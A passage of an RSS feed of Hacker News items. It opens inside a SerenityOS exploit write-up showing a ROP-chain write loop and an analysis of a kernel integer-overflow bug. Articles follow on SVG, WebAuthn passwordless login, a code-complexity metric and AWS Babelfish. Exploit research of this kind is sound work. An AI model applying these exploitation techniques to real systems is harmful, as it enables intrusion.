<span>for</span> <span>(</span><span>let</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>rop</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
  <span>write</span><span>(</span><span>stack_ret</span> <span>+</span> <span>4</span> <span>*</span> <span>(</span><span>2</span> <span>+</span> <span>i</span><span>),</span> <span>rop</span><span>[</span><span>i</span><span>]);</span>
<span>}</span>

<span>// finish to trigger the rop chain</span>
</code></pre></div></div>

<p>After loading this up and setting a breakpoint with gdb at <code>0x9d000000</code>:</p>

<p><img src="https://devcraft.io/assets/serenity/gef.jpg" alt="gef"></p>

<p>Success! Arbitrary code in the browser.</p>

<h3 id="kernel-bug-hunting">Kernel Bug Hunting</h3>

<p>Next it was time to try and find a kernel bug that could be reached from the browser process. There had been a few issues with integer overflows, so I started looking for places that this might happen. After some searching I saw the following in <a href="https://github.com/SerenityOS/serenity/blob/22b0ff05d4a5b087d805d8147ca12efe410cb18f/Kernel/VM/RangeAllocator.cpp#L139">RangeAllocator::allocate_anywhere</a>:</p>

<div><div><pre><code><span>for</span> <span>(</span><span>size_t</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>m_available_ranges</span><span>.</span><span>size</span><span>();</span> <span>++</span><span>i</span><span>)</span> <span>{</span>
    <span>auto</span><span>&amp;</span> <span>available_range</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>i</span><span>];</span>

    <span>// FIXME: This check is probably excluding some valid candidates when using a large alignment.</span>
    <span>if</span> <span>(</span><span>available_range</span><span>.</span><span>size</span><span>()</span> <span>&lt;</span> <span>(</span><span>effective_size</span> <span>+</span> <span>alignment</span><span>))</span>
        <span>continue</span><span>;</span>
</code></pre></div></div>

<p>Each process has a list of available ranges that are used when allocating memory regions. This code is looping through all the ranges and seeing if there is one large enough to hold the requested size, taking into account the alignment (both <code>effective_size</code> and <code>alignment</code> are controlled by the user). The issue is that <code>effective_size + alignment</code> can overflow, resulting in a range being chosen that is too small to hold the requested size.</p>

<p>The <code>available_range</code> is then used to create a new allocated range:</p>

<div><div><pre><code>    <span>FlatPtr</span> <span>initial_base</span> <span>=</span> <span>available_range</span><span>.</span><span>base</span><span>().</span><span>offset</span><span>(</span><span>offset_from_effective_base</span><span>).</span><span>get</span><span>();</span>
    <span>FlatPtr</span> <span>aligned_base</span> <span>=</span> <span>round_up_to_power_of_two</span><span>(</span><span>initial_base</span><span>,</span> <span>alignment</span><span>);</span>

    <span>Range</span> <span>allocated_range</span><span>(</span><span>VirtualAddress</span><span>(</span><span>aligned_base</span><span>),</span> <span>size</span><span>);</span>
    <span>if</span> <span>(</span><span>available_range</span> <span>==</span> <span>allocated_range</span><span>)</span> <span>{</span>
        <span>dbgln</span><span>&lt;</span><span>VRA_DEBUG</span><span>&gt;</span><span>(</span><span>"VRA: Allocated perfect-fit anywhere({}, {}): {}"</span><span>,</span> <span>size</span><span>,</span> <span>alignment</span><span>,</span> <span>allocated_range</span><span>.</span><span>base</span><span>().</span><span>get</span><span>());</span>
        <span>m_available_ranges</span><span>.</span><span>remove</span><span>(</span><span>i</span><span>);</span>
        <span>return</span> <span>allocated_range</span><span>;</span>
    <span>}</span>
    <span>carve_at_index</span><span>(</span><span>i</span><span>,</span> <span>allocated_range</span><span>);</span>

    <span>return</span> <span>allocated_range</span><span>;</span>
</code></pre></div></div>

<p>If it isn’t exactly equal then it carves out the range and add the remaining range back into <code>m_available_ranges</code>:</p>

<div><div><pre><code><span>void</span> <span>RangeAllocator</span><span>::</span><span>carve_at_index</span><span>(</span><span>int</span> <span>index</span><span>,</span> <span>const</span> <span>Range</span><span>&amp;</span> <span>range</span><span>)</span>
<span>{</span>
    <span>ASSERT</span><span>(</span><span>m_lock</span><span>.</span><span>is_locked</span><span>());</span>
    <span>auto</span> <span>remaining_parts</span> <span>=</span> <span>m_available_ranges</span><span>[</span><span>index</span><span>].</span><span>carve</span><span>(</span><span>range</span><span>);</span>
    <span>ASSERT</span><span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>&gt;=</span> <span>1</span><span>);</span>
    <span>m_available_ranges</span><span>[</span><span>index</span><span>]</span> <span>=</span> <span>remaining_parts</span><span>[</span><span>0</span><span>];</span>
    <span>if</span> <span>(</span><span>remaining_parts</span><span>.</span><span>size</span><span>()</span> <span>==</span> <span>2</span><span>)</span>
        <span>m_available_ranges</span><span>.</span><span>insert</span><span>(</span><span>index</span> <span>+</span> <span>1</span><span>,</span> <span>move</span><span>(</span><span>remaining_parts</span><span>[</span><span>1</span><span>]));</span>
<span>}</span>

<span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>Range</span><span>::</span><span>carve</span><span>(</span><span>const</span> <span>Range</span><span>&amp;</span> <span>taken</span><span>)</span>
<span>{</span>
    <span>Vector</span><span>&lt;</span><span>Range</span><span>,</span> <span>2</span><span>&gt;</span> <span>parts</span><span>;</span>
    <span>if</span> <span>(</span><span>taken</span> <span>==</span> <span>*</span><span>this</span><span>)</span>
        <span>return</span> <span>{};</span>
    <span>if</span> <span>(</span><span>taken</span><span>.</span><span>base</span><span>()</span> <span>&gt;</span> <span>base</span><span>())</span>
        <span>parts</span><span>.</span><span>append</span><span>({</span> <span>base</span><span>(),</span> <span>taken</span><span>.</span><span>base</span>…</code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html">https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/02/11/serenityos-writing-a-full-chain-exploit.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26115141</guid>
            <pubDate>Fri, 12 Feb 2021 16:09:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SVG: The Good, the Bad and the Ugly]]>
            </title>
            <description>
<![CDATA[
Score 200 | Comments 191 (<a href="https://news.ycombinator.com/item?id=26114863">thread link</a>) | @davebloggt
<br/>
February 12, 2021 | https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html | <a href="https://web.archive.org/web/*/https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                        SVG, short for <em>“scalable vector graphics”</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.
                    </p><div id="article">
                <!-- Body -->
<figure>
<img src="https://www.eisfunke.com/res/article/svg-logo.svg" alt=""><figcaption>The SVG logo.<a href="#fn1" id="fnref1" role="doc-noteref"><sup>1</sup></a></figcaption>
</figure>
<p><a href="https://en.wikipedia.org/wiki/Scalable_Vector_Graphics">SVG</a>, short for <em>“scalable vector graphics”</em> is a format for, well, scalable vector graphics. In this article I summarize my opinion of the format, what its problems are and suggest what could be done to improve things.</p>
<p>I’ve been using SVG together with Inkscape regularly for a few years for sketches and graphics, and like to write it by hand to satisfy my love for precision and art through code. SVG and I have a kind of love-hate relationship. It’s powerful and has some nice free and open-source tooling, but the format itself is pretty ugly.</p>
<h2 id="the-good">The Good</h2>
<ul>
<li><p>It’s <em>the</em> format for vector graphics. It is well supported by a range of programs from Adobe Illustrator to Inkscape for editing and in various browsers.</p></li>
<li><p>It’s a web standard so you can use it directly in websites. You can also use CSS with it.</p></li>
<li><p>It’s XML-based, so the syntax is familiar, it’s extensible and can benefit from the vast XML ecosystem. For example, using <a href="https://en.wikipedia.org/wiki/XLink">XLink</a> you can reference other elements and definitions in an SVG file. Or <a href="https://inkscape.org/">Inkscape</a> uses custom XML tags to extend SVG into their editor exchange format.</p></li>
<li><p>It’s powerful. You can do <em>a lot</em> with it. It obviously supports various path types and shapes, supports text and more, but also animations, gradients, effects and more.</p></li>
</ul>
<h2 id="the-bad">The Bad</h2>
<p>It’s a web standard. And as is customary for a web standard, SVG is magnificiently bloated. The <a href="https://www.w3.org/TR/SVG11/REC-SVG11-20110816.pdf">SVG specification</a> brings a whopping 826 (<em>eight-hundred twenty-six</em>) pages to the table. And as if that’s not enough, it’s also XML-based and cross-linked with other web standards, driving the scope of any implementation to dizzying heights.</p>
<p>If you want to be sure to correctly render all SVG files, not only do you have to consider 800 pages of SVG spec, but e.g.&nbsp;another 20 pages of <a href="https://www.w3.org/TR/xlink11/">XLink spec</a>. Oh, and CSS as well, by the way. And, I shit you not, <em>JAVASCRIPT</em>. Yes. <a href="https://developer.mozilla.org/en-US/docs/Web/SVG/Element/script">SVG files can include <code>&lt;script&gt;</code> tags.</a></p>
<p>SVG fits right in with web browsers. They’re hilariously bloated already, they already implement stuff like CSS and JavaScript that a complete SVG implementation requires. This problem of SVG is actually just the <a href="https://drewdevault.com/2020/03/18/Reckless-limitless-scope.html">problem of the web in general</a>. It’s scope is huge, it’s bloated and hard to work with.</p>
<p>SVG is nothing you could implement in a day. Or a week. Or a month. The huge amount of specifications, that are most often only partly implemented, makes it very hard to overview what supports what, confusing the user as to what features they can actually use if they want their SVG file to be universally supported.</p>
<p>Furthermore the XML-based syntax is pretty ugly and needlessly verbose. It’s tiring to write by hand and just as tiring to parse or generate automatically.</p>
<h2 id="the-ugly">The Ugly</h2>
<p>A central problem that can be extracted from the points listed above is the one I detailed in my article about <a href="https://www.eisfunke.com/article/language-design-machine-or-human.html">language design for machines vs.&nbsp;humans</a>: SVG doesn’t know what it wants to be, a machine-focused language or a human-focused language and ends up doing badly in both aspects.</p>
<p>Is it a machine-processible language? It’s far too bloated for that. Writing parsers, renderers and generators for SVGs is a huge task. The syntax is repetitive and complex. It has a lot of features that could be represented by more basic features.</p>
<p>But is it a format well-suited for direct usage by humans? Well, no. Firstly, the exhausting syntax and complexity is also bad for human users. Secondly, it misses a lot of features that would make it suitable for direct use. A graphics language that is meant for direct human use would be <a href="http://texdoc.net/pkg/tikz">Ti<em>k</em>Z</a> for LaTeX. While it’s not a great language regarding user experience in my opinion, it is definitely meant for humans and has the necessary features to help making creating complex graphics easy. But nobody would have the idea to use Ti<em>k</em>Z code as an interchange format for the finished graphic. Nobody would want to implement 1300 pages of Ti<em>k</em>Z manual just to view some graphic. Instead you compile it into an PDF (which is also a horrible format and badly bloated, but well). If SVG was a language meant for human use, compiling it into a machine-focused format would be the way to go as well, but as I said – it isn’t. It’s neither.</p>
<h2 id="what-now">What now?</h2>
<p>A good idea would be to develop a simple vector graphics exchange format that is desigend to be easily processed by machines. As minimal in features as possible. Maybe JSON-based, definitely not XML-based. You should be able to implement a basic renderer in a few days, or even better, hours, without depending on two metric tons of XML ecosystem libraries. Bezier curves, elliptic curves, fills, outlines and gradients should mostly suffice to represent every unanimated SVG. An extension could allow animations in a separate file extension.</p>
<p>This minimal and well-delimited format could then have a strict test suite and be implemented in browsers and image viewers with relative ease. Users could rely on their graphic working everywhere and implementers wouldn’t have to worry about implementing XLink, CSS and JavaScript as well. It could save bandwidth and computation power. Compilers from and to SVG could be written for compatibility.</p>
<p>It could be used as export format of user-facing programs like Inkscape or Adobe Illustrator. For people wanting to markup graphics through code there’s already stuff like Ti<em>k</em>Z, <a href="https://diagrams.github.io/">Haskell diagrams</a> or <a href="https://matplotlib.org/stable/index.html">Python matplotlib</a> that could also export to the new minimal interchange format.</p>
<p>I’m actually thinking about making a slim machine-focused vector graphics format (the name <em>“SlimSVG”</em> has been suggested :D) and writing my own human-focused Haskell graphics creation library with similar goals for my own purposes in the future, maybe as a student research project for the university.</p>
<p>In summary: Decide whether a language is for humans or for machines and do one of those things. And do the one thing well instead of both, but badly.</p>
<hr>
<p><strong>Update 1:</strong> This article was posted on <a href="https://news.ycombinator.com/item?id=26114863">Hacker News</a> and landed on the front page, currently it’s on rank 3. I’m honored! <a href="https://news.ycombinator.com/reply?id=26115086&amp;goto=item%3Fid%3D26114863%2326115086">In the comments there</a> somebody mentioned an <a href="https://www.xul.fr/svgtetris.svg">interesting use of the <code>&lt;script&gt;</code> tag in SVG</a>. I’m unsure though whether I should be impressed or horrified :D</p>
<p><strong>Update 2:</strong> Somebody posted this on <a href="https://www.reddit.com/r/programming/comments/livw57/svg_the_good_the_bad_and_the_ugly">Reddit</a> as well. Currently, there are over 150 comments, wow.</p>
<p><strong>Update 3:</strong> PEOPLE, PLEASE. This is absolutely not about “XML is bad, let’s do JSON instead”. I actually like XML more than JSON in total, I’m a fan of XML schema and nice strong schemas. And while I still don’t like the syntax, XML generally is a good fit for a document markup language like HTML. I mostly wouldn’t care whether a good format with a good data model was encoded in JSON, XML, YAML, binary, Brainfuck or monkey feces. The encoding really is the least important part. I just think that for a strictly machine-focused format for data JSON would be a better choice.</p>
<p>I guess though I should have anticipated that saying that I don’t like XML and then mentioning the word “JSON” would start a religious war.</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn1" role="doc-endnote"><p><a href="https://commons.wikimedia.org/wiki/File:SVG_logo.svg">Image source</a>, licensed under CC-BY-SA-4.0<a href="#fnref1" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
                <!-- /Body -->
            </div></div>]]>
            </description>
            <link>https://www.eisfunke.com/article/svg-the-good-the-bad-and-the-ugly.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114863</guid>
            <pubDate>Fri, 12 Feb 2021 15:43:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Effortless Security on the Web]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26114546">thread link</a>) | @mooreds
<br/>
February 12, 2021 | https://engineering.q42.nl/passwordless-authentication/ | <a href="https://web.archive.org/web/*/https://engineering.q42.nl/passwordless-authentication/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Wouldn’t it be amazing if you could sign up with a website with face recognition on your mobile phone and the next day on your MacBook you could just use your fingerprint scanner to sign in? What if we told you that this is possible today? </p><p>Currently you manage your accounts using passwords that you have to remember. For most users this is done by either remembering various different passwords, or worse; using the same one for every website. While social login has brought us a convenient way to sign in to websites using a single account, it still requires an account with a password. On top of that, there are security and privacy risks when using a single account for each service. Extra layers of security, like two factor authentication, can be added. But those come at the cost of complexity for the end user. The problem lies in passwords themselves. To solve it we should, and finally can, get rid of them all together to provide a user-friendly and secure authentication flow. </p><p>Even though it is still early and it has not landed in all browsers, we feel this is the future. We have already looked into what it takes to implement. As with any form of authentication, it is definitely not a trivial subject and it requires effort to implement. But please bear with us though, as we talk you through the steps. The result for the end user is definitely worth it.</p><p>Passwordless authentication on the web is made possible by the new Web Authentication (WebAuthn) API. If you’re not familiar with this API, you can check out <a href="https://webauthn.guide/#about-webauthn">this guide</a> or the video below to make it all a bit more tangible.</p><figure><iframe width="480" height="270" src="https://www.youtube.com/embed/hk7kDRx3MuQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><figcaption>The simplicity of using WebAuthn</figcaption></figure><h3 id="connecting-devices">Connecting devices</h3><p>The WebAuthn API supports replacing passwords with biometric data through device specific authenticators. These authenticators are, for example, the facial recognition &amp; fingerprint scanners built into (mobile) devices.</p><p>Creating accounts and logging in with a device-specific authenticator has one problem. The fingerprint scanner on a mobile phone isn’t connected to the one on a laptop. So, how does a user access their account on a laptop if they created the account on a mobile phone? </p><p>For multi-device passwordless authentication we created a proof-of-concept flow. Our solution uses a secure environment already shared on all devices: email. A secure link sent through email connects the laptop &amp; mobile phone. No typing required at all. Let’s explore this flow together.</p><h3 id="under-the-hood">Under the hood</h3><p>For most server side languages, there’s a library available that does the heavy lifting around WebAuthn by implementing FIDO2. We went with <a href="https://github.com/abergs/fido2-net-lib">abergs/fido2-net-lib</a> on .NET core. The juicy part is in expanding the user interaction flow. Let’s start with registration. </p><p>A user enters a desired username (a valid email in our case), presses the register button and is presented with a biometric confirmation modal to resolve a generated challenge that is sent by the server. When the user successfully authenticates with their biometric info, an account is created for that user.</p><p>During account creation, these steps are executed:</p><ol><li>Server sends challenge</li><li>Device requests biometric confirmation</li><li>User scans finger</li><li>Device creates public + private key</li><li>Device sends public key as response</li><li>Server creates user account associated to that public key</li></ol><p>When a user later wants to login to the website, they enter their username (email) again and then are presented with a biometric confirmation modal to resolve a generated challenge. This time the server checks if the response (that the browser generates based on the given challenge and private key) matches the user with the given email address. If that’s the case, the user is logged in.</p><p>During user login, these steps are executed:</p><ol><li>Server sends challenge</li><li>Device requests biometric confirmation</li><li>User scans finger</li><li>Device signs challenge with private key</li><li>Device sends response to server</li><li>Server verifies response with public key</li></ol><p>On a technical level this is not too different compared to a regular password login, if you would hash and salt the password before sending it over. The biggest difference is we’re not asking the user to authenticate with something that needs to be remembered.</p><h3 id="implementing-multi-device-sign-in">Implementing multi-device sign-in</h3><p>Logging in with a platform authenticator only works if the local device has credentials stored for this website. The first step in making multi-device possible is by detecting if the device has credentials for the current website user account or not. If it doesn’t, the Web Authentication API will throw an error. This allows us to ask the user if they want to add this device to their account.</p><figure><pre><code>let credentials;
try {
  credentials = await navigator.credentials.get(optionsObject);
} catch (err) {
  // Show modal to ask if the user wants to add this device to their account
  confirmAddDevice();
}</code></pre><figcaption>Detect if the device platform authenticator has known credentials</figcaption></figure><p>This is the hook that allows us to extend the user experience. For our take on a possible UX flow for passwordless multi-device authentication we came up with the diagram below. Highlighted in blue is the email confirmation flow that we found missing in existing implementations of logging in without a password. Remember that, while this diagram may seem daunting at first, all the parts in black are taken care of by WebAuthn and the FIDO2 library. Luckily that also is the hardest and most boring part.</p><figure><img src="https://lh3.googleusercontent.com/vwtyGrDkcChPhUrxucOV-6IbyzezykWKK-NI_KEF4px3Ke-uGunrfKZXd34gd0z5R0tfd1-xEiidbgTCVbKK09qdhKiW6ezDYaUg_keR61DoGJmJR1Xs4vXokVCnSzWAD2fSwFFG"><figcaption>Expand the platform authenticator flow to support multiple devices</figcaption></figure><p>Our flow starts when the user wants to sign in to their existing account from an unknown device. The flow starts similar to the regular login flow. However, we can now detect when the device has no credentials stored for this website.</p><p>Interaction wise this is where things get interesting. We can let the user know that this is an unknown account that is being attempted to sign in to. But just showing an error is a dead path. A user expects an immediate follow-up action to add this device to the account.</p><p>In our case we show a modal to ask the user if they want to add the new device:</p><figure><pre><code>async function confirmAddDevice() {
  const confirm = confirm('Do you want to add this device to your account?');
  if (!confirm) {
    // User denied the confirm modal, do nothing
    return;
  }

  try {
    await fetch('/api/add-device', {
      method: 'POST',
      body: {
        email: this.email
      }
    });

    alert('Email sent, click the link in the mail to continue the process.')
  } catch {
    alert('Could not send an email, please try again later.')
  }
}</code></pre><figcaption>Ask the user if they want to add the device to their account</figcaption></figure><p>When the user confirms the action, the client sends a request to the server. Luckily we know how to securely contact the user because they registered with their email as username. The server then sends an email that allows the user to register their device.</p><figure><pre><code>[HttpPost]
[Route("/add-device")]
public async Task&lt;JsonResult&gt; AddDevice([FromBody] string email)
{
  var user = Storage.GetUser(email);
  if(user == null) {
    return NotFound();
  }

  var otp = Storage.GenerateAndStoreOneTimePasswordForUser(user);

  var response = await SendAddDeviceEmail(user, otp);
  return Json(response);
}</code></pre><figcaption>Send an email to the user</figcaption></figure><p>By clicking the link in the email, the user confirms this device may be added to their account. The flow is just like with the first device, only adding a one time password (OTP) in the form of a link in an email. The OTP allows the new device to be securely linked to the existing account. This is done by the server, which checks if the OTP matches the one generated for the user, and stores the challenge response as an additional device linked to the account.</p><p>This way, minimal user input is required to allow multi-device passwordless authentication on the web. On top of that, we leverage existing patterns for account validation (through email) that users are already used to on the web.</p><h3 id="outro">Outro</h3><p>We are very excited to work towards a more secure and effortless web, and can’t wait to use this in production. What’s your opinion on passwordless authentication, and how should multi-device usage be addressed? We would love to hear your ideas and get to know your implementations.</p><hr><p><em>Do you love figuring out new features like multi-device passwordless authentication? Then please do check our job vacancies (in Dutch) at <a href="https://werkenbij.q42.nl/">https://werkenbij.q42.nl</a>!</em></p>
                </div>
            </section></div>]]>
            </description>
            <link>https://engineering.q42.nl/passwordless-authentication/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114546</guid>
            <pubDate>Fri, 12 Feb 2021 15:19:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[For the Love of All That's Holy, Use CCL to Control Complexity in Your Systems]]>
            </title>
            <description>
<![CDATA[
Score 18 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26114364">thread link</a>) | @brobdingnagians
<br/>
February 12, 2021 | https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/ | <a href="https://web.archive.org/web/*/https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div id="post-body">
        <p>&lt;rant&gt;Two years ago I sat in on a security meeting. The subject was protecting the code and associated websites from attack.</p><p>"I'd just attack the npm packaging system, introducing subtle changes in several that would work together to do whatever I wanted."</p><p>All I got was blank stares, and this was from professionals. From <a href="https://www.bleepingcomputer.com/news/security/researcher-hacks-over-35-tech-firms-in-novel-supply-chain-attack">this week's reading</a>:</p><blockquote>Unlike <a href="https://www.bleepingcomputer.com/news/security/malicious-npm-project-steals-discord-accounts-browser-info/">traditional typosquatting attacks</a> that rely on social engineering tactics or the victim misspelling a package name, this particular supply chain attack is more sophisticated as it needed no action by the victim, who automatically received the malicious packages.<p>This is because the attack leveraged a unique design flaw of the open-source ecosystems called <strong>dependency confusion.</strong></p></blockquote><p>Even using things like Test-Driven Development, programmers can only reason about a small part of the code in front of him in the IDE. (In fact, one of the reasons TDD is so successful is because programmers have no idea at how much they suck at actually understanding what they're doing).</p><p>From a recent study:</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/EsXlJyCXYAAD9x7.png" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/EsXlJyCXYAAD9x7.png 600w, https://danielbmarkham.com/content/images/size/w1000/2021/02/EsXlJyCXYAAD9x7.png 1000w, https://danielbmarkham.com/content/images/size/w1600/2021/02/EsXlJyCXYAAD9x7.png 1600w, https://danielbmarkham.com/content/images/2021/02/EsXlJyCXYAAD9x7.png 1890w" sizes="(min-width: 720px) 720px"></figure><p>Here's the takeaway graphic:</p><figure><img src="https://danielbmarkham.com/content/images/2021/02/2021-02-11_9-41-46.jpg" alt="" srcset="https://danielbmarkham.com/content/images/size/w600/2021/02/2021-02-11_9-41-46.jpg 600w, https://danielbmarkham.com/content/images/2021/02/2021-02-11_9-41-46.jpg 678w"></figure><p>Note: this result is seeking out a mean, regular coders writing regular code. Your mileage may vary.</p><p>Why is this? Let's take two code samples:</p><!--kg-card-begin: markdown--><pre><code>echo Hello World
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code>#include &lt;cstdio&gt;

int main()
{
    printf("hello from %s!\n", "HelloWorld");
    return 0;
}
</code></pre>
<!--kg-card-end: markdown--><p>In the first example, how many symbols is the programmer manipulating to reach their goal? Only one, "echo" In the second example, how many symbols are being manipulated?</p><p>I counted seven, but I wasn't trying to be strict.</p><p>What do these seven involve? There's namespaces, libraries, standard function signatures, string substitution, OS return values, and so on.</p><p>Do any of these matter to the new C# programmer? Of course not! That's why it's called "Hello World". You're supposed to be able to type in a few symbols and start doing something useful right away.</p><p>The waters get murky very quickly after that. Let's say your boss sends you an email:</p><p>"Jenkins, add the cover sheet to all of those TPS reports"</p><p>Something goes wrong. The boss is unhappy. You two have a conversation about what you did that was mistaken.</p><p>Suppose instead you're looking at the following code:</p><!--kg-card-begin: markdown--><pre><code>WorkingStack.Reports.AddSheet(cover);
</code></pre>
<!--kg-card-end: markdown--><p>The boss is mad because it's not working right.</p><p>You can certainly go into the boss's office and have that same conversation, just this time over code instead of an email. <em>In fact, that's what you have to do</em>. Without a bunch more source code, what the hell does that C# code do, anyway? You don't know. It says it does the same thing as the boss wanted, but for all you know it's mailing off your tax returns to Russian hackers.</p><p>Most of modern programming is spent creating and consuming fake abstractions that are much more leaky and buggy than we'd like admit. In fact, it's grown far, far beyond our ability to reason about. It's magic. We spend a lot of time pretending that this isn't the case, then cursing when reality rears its ugly head again.</p><p>When I was writing <a href="https://leanpub.com/info-ops2">my second book</a>, I had to address this problem because reasoning about code and controlling complexity is the number one problem in software development today. It's the reason we have buildings full of hundreds of developers wasting a lot of time and money. Our incentives are wrong.</p><p>The best thing to look for in any professional, doctor, lawyer, coder, etc is their ability to not engage with a problem, instead solving it in a simple and non-intrusive way. The worst behavior from professionals are the folks who are going to do a lot of work no matter what. These guys look busy, and they’re deep in a bunch of technically wonky stuff that nobody understands, so naturally they look like they know what they’re doing and are doing a good job. The guy who shows up in flip-flops and after a five-minute conversation solves your problem? He’s just some smart eleck showman, probably a con man.</p><p>We don’t teach coders the one skill they need most of all: adding incremental complexity as-needed. Nobody talks about choosing what to add and why. Nobody talks about ways to understand you’ve gone too far (except for a few folks like me. Apologies for the shameless plug.)</p><p>For some odd reason, discussions on frameworks and complexity always devolve into some version of “Dang kids!” vs. “Talentless luddite!” As many people have pointed out, not only do we not teach or talk about incremental complexity, if you don’t have the appropriate buzzwords in your CV, you don’t get hired. So BigCorps naturally end up with scads of people who did well on scads of tech that somebody decide they had to use/learn but nobody very good at actually making things happen.</p><p>This can't continue, and I want to do my part in making it end. The answer I came up is something I call it <strong>Code Cognitive Load (CCL)</strong>. It's the amount of risk you take on as a programmer looking at any piece of code to manipulate it, whether coding fresh or doing maintenance on existing code.</p><ol><li>It's scoped first by method/function and then by compilation unit. There's no other scoping (namespace, class, module, etc.)</li><li>To compute, you add up four things: symbols you are required to look at to do your work, exceptions that using those symbols may throw, &nbsp;any editable code underneath that you may have to read or write for those symbols to work, and exceptions that code may throw</li></ol><p>You can see for the first Hello World example, there's only one symbol, echo, and there's only one general type of exception, and that's related to system resources. For the second example, the count easily goes into the dozens.</p><p>Why is this related to the security problem I led off with? Because if you have code you can't reason about, you don't just have a risk for bugs, it's a security risk too. The code doesn't care whether it's busy screwing up your beautiful solution or hacking your local network. You can't reason about it. Period. That's the problem. It's doing whatever it's coded to do.</p><p>Do npm packages count as "editable code underneath that I have to read or write for these symbols to work"? Sure, if you're downloading code and compiling it, you may have to edit it. It's a risk. If you're just hotlinking to a dll or something, that's different. If you're using precompiled code, whatever you've got, you've got. It may be buggy as hell and it may do nasty things that make you sad and drink by yourself late at night, but it's not a complexity issue, it's some other kind of issue, security, performance, and so on. Don't confuse them. You address and work with the problems of that precompiled library in a totally different way than you would with code you may one day have to plow through.</p><p>Code Cogntivie Load (CCL) is not a good/bad metric. It's a measure of the risk in complexity you're assuming to do whatever work you have to do. Some problems may naturally require a great deal of complexity risk. Others not so much. That's your call, not mine.</p><p>The point is that you're measuring it, instead of just ignoring it until something goes wrong. Is your solution doing mostly the same thing but your CCL is going through the roof? You're most likely doing something wrong, since your code's value is staying the same while your coding risk is dramatically increasing. </p><p>There's no way of knowing whether code is appropriately complex or not, but we can (and should) measure how much <em>complexity risk</em> we're taking on ourselves and our downstream maintenance workers.</p><p>This will change the way you code and the way you think about coding. Good. Looking at the software landscape today, things need changing.</p><p>&lt;/rant&gt;</p>    </div>
</div></div>]]>
            </description>
            <link>https://danielbmarkham.com/for-the-love-of-all-thats-holy-use-ccl-to-control-complexity-in-your-systems/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26114364</guid>
            <pubDate>Fri, 12 Feb 2021 15:04:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AWS Babelfish: The Elephant in the PostgreSQL Room?]]>
            </title>
            <description>
<![CDATA[
Score 172 | Comments 134 (<a href="https://news.ycombinator.com/item?id=26114281">thread link</a>) | @ahachete
<br/>
February 12, 2021 | https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/ | <a href="https://web.archive.org/web/*/https://postgresql.fund/blog/babelfish-the-elephant-in-the-room/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <div>
        <div>
            <div>
                
                <div>
                    <p>On December 1st, 2020, <a href="https://aws.amazon.com/blogs/opensource/want-more-postgresql-you-just-might-like-babelfish/">Amazon AWS announced Babelfish</a>. Babelfish “<em>adds an endpoint to PostgreSQL that understands the SQL Server wire protocol Tabular Data Stream (TDS), as well as commonly used T-SQL commands used by SQL Server. Support for T-SQL includes elements such as the SQL dialect, cursors, catalog views, data types, triggers, stored procedures, and functions</em>”. Wow. <strong>SQL Server wire and application compatibility for PostgreSQL!</strong></p>
<p>What this means is that Babelfish will be able to “impersonate” a SQL Server database. Applications may be able to run unchanged, believing that they are connecting to SQL Server, when they will actually be connecting to PostgreSQL-Babelfish.</p>
<p>Surely, compatibility will not be 100% at the beginning. But it will keep improving, and <strong>as long as it provides enough compatibility for a nice set of applications to run unchanged on Babelfish, it will open the door to migrations and replacing SQL Servers with Babelfish</strong>. This is very good news for the PostgreSQL Community!</p>
<h2 id="brief-analysis-on-postgresql-popularity">Brief analysis on PostgreSQL popularity</h2>
<p><a href="https://db-engines.com/en/blog_post/85">PostgreSQL has been named (again) database of the year 2020</a>. This award is given based on “<em>DBMSs sorted by how much they managed to increase their popularity in 2020</em>”, which means that <strong>PostgreSQL was the database that grew the most in popularity in 2020</strong>. <strong>But in absolute terms, PostgreSQL’s popularity is still way behind that of Oracle, MySQL and SQL Server</strong>. Let’s analyze <a href="https://db-engines.com/en/ranking_trend">db-engines popularity trend chart</a> for the Top4 DBMS, on a linear scale (db-engines presents results on a logarithmic scale):</p>
